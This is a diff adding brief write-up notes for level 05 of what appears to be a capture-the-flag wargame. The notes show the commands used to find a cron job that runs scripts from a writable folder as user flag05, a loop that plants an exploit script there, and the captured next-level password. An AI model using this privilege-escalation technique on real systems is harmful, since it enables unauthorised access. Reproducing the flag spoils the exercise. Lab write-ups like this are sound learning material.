@@ -1,0 +1,11 @@
+level 05:
+- Ran : find / -type f -user flag05 -group flag05 2> /dev/null 
+- Output : two files with one script runing a timed script 
+- Ran: while true; do ps -u flag05 >> /tmp/flag05_processes.txt; done 
+- Ran : grep "?" /tmp/flag05_processes.txt
+- Output: Identified  su and sh under flag05 process
+- Exploit Identified: /usr/sbin/openarenaserver (owned by flag05) runs and deletes scripts in /opt/openarenaserver/ (writable by level05) as flag05 via a cron-like script every ~15 seconds.
+- Exploit Attempt: Created /tmp/exploit.sh:
+- Ran: while true; do cat /tmp/exploit.sh > /opt/openarenaserver/exploit.sh; chmod +x /opt/openarenaserver/exploit.sh; done
+- Output: cat /tmp/pass.txt showed: viuaaale9huek52boumoomioc > level06
+
